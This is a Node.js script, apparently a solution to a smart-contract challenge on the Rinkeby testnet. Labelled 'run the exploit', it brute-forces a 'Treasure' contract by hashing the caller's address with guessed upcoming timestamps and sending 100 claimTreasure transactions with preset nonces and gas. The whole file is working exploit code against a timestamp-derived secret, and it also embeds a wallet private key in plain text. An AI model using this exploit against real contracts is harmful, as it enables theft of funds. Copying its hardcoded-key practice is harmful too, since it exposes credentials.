#!/usr/bin/env node
const ethers = require('ethers')
const fs = require('fs');
const utils = ethers.utils;
var Web3 = require('web3')
var web3 = new Web3(Web3.givenProvider || 'http://127.0.0.1:7545/');

const contractAddr = "0xcd82B734351b9398DC7Cf380556507Ba422754A5";
const privKey = "0x1a165fed6604a7ef176ee326c9bcd7c133cff973003a1d0915b61a36eb5b7aa2";
const addr = "0xF7998603a4390faE1817870CBd2c6039551b77D8";

//createWallet();
connect();

async function connect() {
	provider = await ethers.getDefaultProvider("rinkeby");
	wallet = new ethers.Wallet(privKey, provider);
	console.log(wallet.address)
	abi = await JSON.parse(fs.readFileSync("contracts/Treasure.json"));
	contract = new ethers.Contract(contractAddr, abi, wallet);
	baseNonce = 1211;
	// run the exploit
	//for(var k = 0; k < 10; k++) {
		date = Date.now();
		now = date/1000;
	for(var i = 0; i < 100; i++) {
		console.log(Math.round(now + i + 5));
		key = keccak(addr, Math.round(now + i + 5));
		console.log(key);
		try {
			let overrides = {
			  gasPrice: 30000000000,
		  	  gasLimit: 140000,
		  	  nonce: baseNonce + i,
			};
			contract.claimTreasure(key, overrides);
		} catch (error) {
			console.log(error);
		}
	//}
}
}

async function createWallet() {
	wallet = ethers.Wallet.createRandom();
    console.log(wallet.privateKey);
}
 
function keccak(hunter, date) {
  encMsg = web3.eth.abi.encodeParameters(
      ['address', 'uint256'],
    [hunter, date]);
  var hash = web3.utils.soliditySha3(encMsg);
  console.log(encMsg);
  return hash;
}